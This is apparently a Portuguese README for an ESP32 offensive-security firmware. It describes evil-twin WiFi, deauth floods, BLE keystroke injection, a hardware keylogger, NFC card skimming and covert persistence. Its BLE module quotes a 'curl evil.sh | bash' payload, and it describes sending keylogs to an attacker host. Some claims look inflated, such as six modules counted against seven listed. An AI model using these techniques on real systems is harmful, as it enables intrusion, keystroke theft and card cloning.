# 🦎 Lele Origin 1.0 - Arsenal Completo de Pentesting

<p align="center">
  <strong>Firmware ESP32 com arsenal completo de ferramentas de segurança ofensiva</strong>
</p>

---

## 📋 Sobre

O **Lele Origin** é um firmware ESP32 com arsenal completo para operações de segurança ofensiva, incluindo ferramentas avançadas de pentesting. Badge Black Hat completo em um dispositivo ESP32.

### ✨ Arsenal Completo de Pentesting

| Módulo | Recursos | Ataques |
|--------|----------|---------|
| 📡 **WiFi Evil Twin + Deauth** | Scan redes, AP fake SSID igual, WIFI_AP_STA, canal 6 fixo, beacon desaparecer em 1s, deauth floods bursts 10pkts/100ms via esp_wifi_80211_tx raw, pula WPA3 | Evil Twin + Deauth |
| 📶 **BLE Keyboard Inject** | ESP32 como HID via NimBLE, pareia sem PIN, injeta Ctrl+Alt+Del + batch payload (curl evil.sh \| bash), despareia automaticamente | Rubber Ducky BLE |
| 🔌 **UART Keylogger** | Leitura teclado matricial 5x5 via GPIO 27-31/32-36, debounce 5ms esp_intr_alloc, buffer circular 1K IRAM, AES criptografado SD keystroke.log, fallback NVS 128 bytes | Hardware Keylogger |
| 💳 **NFC Skimmer** | PN532 SPI pins 5,18,19,23, lê MIFARE 1K sem chave (nested attack), copia UID + setores SD cartao_001_uid.dump, detecta badges corporativos | RFID Cloning |
| 🔀 **Persistence** | DNS poisoning Evil Twin google.com -> attacker IP, HTTPS POST logs keylogger attacker:8443, ICMP tunneling firewall bypass | Backdoor Implants |
| 🛡️ **Stealth Total** | Deep sleep 90%, wake timer/GPIO 0, LED blink código 0x1 ataque, MAC spoof random 5min esp_wifi_set_mac, no serial debug boot | Zero Detection |
| 🚀 **Network Simulation** | ESP32 ultra-high performance: BLE 1000pkt/s Core1, WiFi 1200pkt/s Core0, UART DMA real-time, clock 160-240MHz ADC-monitored, berserk mode 240MHz ambos cores | Critical Network Sim |

**Total: 6 módulos especializados de pentesting implementados**

### 🔒 Segurança & Core (Novidades v1.0)

- **Aggressive SD Boot:** Wipe automático do flash interno a cada boot. Operação 100% via SD.
- **Secure Boot (Paranoid Mode):** Verificação de integridade CRC32 e monitoramento térmico/voltagem.
- **Zero-Trace:** Nenhuma configuração sensível salva na memória interna.
- **Stealth Mode:** Deep sleep 90% uptime, MAC spoofing automático, LED signaling.
- **Battery Optimizations:** 3 modos de energia (Economy 14d, Balanced 5d, Force 8h), ADC monitoring, deep sleep inteligente, logging de corrente.

---

## 🔧 Instalação

### Gravando o Firmware

```bash
esptool.py --port COM3 write_flash 0x00000 Lele-CYD-2USB.bin
```

Ou compile seu próprio:

```bash
pio run -e CYD-2USB -t upload
```

---

## 📚 Documentação

A documentação completa está na pasta [docs/](docs/):

- [Início Rápido](docs/INICIO_RAPIDO.md)
- [Hardware](docs/HARDWARE.md)
- [Funcionalidades](docs/FUNCIONALIDADES.md)
- [Compilação](docs/COMPILACAO.md)

---

## 🔌 Hardware Suportado

| Placa | Status |
|-------|--------|
| CYD-2USB | ✅ Suportado |

### Módulos Externos

| Módulo | Uso |
|--------|-----|
| CC1101 | SubGhz RF |
| NRF24L01 | 2.4GHz |
| PN532 | RFID/NFC |

---

## 🙏 Créditos

Baseado no projeto [Lele](https://github.com/pr3y/Lele) - agradecimentos especiais a toda a comunidade que tornou isso possível.

Veja [CONTRIBUIDORES](docs/CONTRIBUIDORES.md) para a lista completa.

---

## ⚠️ Aviso Legal

O Lele Origin é uma ferramenta para **testes de segurança autorizados**.

O uso para atividades maliciosas ou não autorizadas é **estritamente proibido**.

Distribuído sob licença **AGPL**. Use por sua conta e risco.
